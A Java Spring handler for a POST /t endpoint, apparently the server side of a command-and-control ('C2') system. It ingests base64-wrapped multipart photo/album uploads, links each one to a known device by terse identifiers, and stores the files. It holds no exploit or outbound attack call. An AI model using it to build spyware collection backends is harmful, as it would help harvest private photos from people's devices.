package com.consume.service.handlers;

import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.AbstractC2Handler;
import com.consume.service.BodyNotReadyException;
import com.consume.util.HeadersUtil;
import com.consume.util.MultipartParser;

/**
 * POST /t：相册 / 照片（XADD.md §5.6）。
 *
 * Body 形如 {@code raw64:<base64(multipart/form-data)>}，multipart 字段：
 * idx / ftu / sbu / rid / b / c / s / d / m / u / f / ts / lhu / sig / file。
 *
 * 流程：
 *   1. body 就绪检查 → 未就绪抛 {@link BodyNotReadyException} 重试
 *   2. 解析 multipart
 *   3. save_event_decrypt（不含 file blob）
 *   4. 绑设备：d/f → lhu → u/s；找不到则 ACK 丢弃（不新建、不重试等 /a）
 *   5. save_album → album + 文件落盘
 */
@Component
public class HandleT extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Value("${news4.album.persist:true}")
    private boolean albumPersist;

    @Override
    public String path() {
        return "/t";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /t 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);

        // 1. body 就绪检查：原始 body 文本长度 vs Content-Length
        String rawBody = ctx.getBody();
        String contentLenStr = HeadersUtil.header(ctx.getHeadersJson(), "Content-Length");
        long contentLength = parseLong(contentLenStr, 0L);
        if (contentLength > 0 && (rawBody == null || rawBody.length() < contentLength)) {
            long have = rawBody == null ? 0 : rawBody.length();
            log.info("正常日志:[c2_handlers][BODY-WAIT] /t body 未就绪, id={}, have={}, need={}",
                    ctx.getRecordId(), have, contentLength);
            throw new BodyNotReadyException("body not complete: have=" + have + ", need=" + contentLength);
        }

        // 2. 解析 multipart
        MultipartParser.Result parsed = MultipartParser.parse(rawBody);
        Map<String, String> fields = parsed.getFields();
        byte[] fileBlob = parsed.getFileBlob();
        String fileName = parsed.getFileName();

        // 3. 解密落库（不含 file blob）—— /t 非 AES，记录占位
        store.saveEventDecrypt(ctx, "", ctx.getKeyLabel());

        // 4. 关联设备：先 d/f→deviceid，再 lhu→device.lhu；/t 永不新建
        String d = field(fields, "d");
        String f = field(fields, "f");
        String u = field(fields, "u");
        String m = field(fields, "m");
        String s = field(fields, "s");
        String lhu = field(fields, "lhu");
        log.debug("正常日志:[c2_handlers] /t 设备字段, id={}, d={}, f={}, u={}, s={}, m={}, lhu={}",
                ctx.getRecordId(), d, f, u, s, m, lhu);
        Long rowId = deviceResolver.resolveAndLink(ctx, d, f, u, m, null, s, lhu);
        if (rowId == null) {
            log.info("正常日志:[c2_handlers] /t 无设备 rowId，跳过 album 并 ACK, id={}", ctx.getRecordId());
            return;
        }

        // 5. album 落库 + 文件落盘
        if (albumPersist) {
            store.saveAlbum(ctx, fields, fileBlob, fileName);
        } else {
            log.info("正常日志:[c2_handlers] /t album 持久化已关闭 (news4.album.persist=false), id={}",
                    ctx.getRecordId());
        }

        log.debug("正常日志:[c2_handlers] call handle_t 完成, id={}, deviceRowId={}, deviceid={}, fileLen={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId(),
                fileBlob == null ? 0 : fileBlob.length);
    }

    private static String field(Map<String, String> fields, String k) {
        if (fields == null) {
            return "";
        }
        String v = fields.get(k);
        return v == null ? "" : v;
    }

    private static long parseLong(String s, long def) {
        if (s == null || s.isEmpty()) {
            return def;
        }
        try {
            return Long.parseLong(s.trim());
        } catch (Exception e) {
            return def;
        }
    }
}
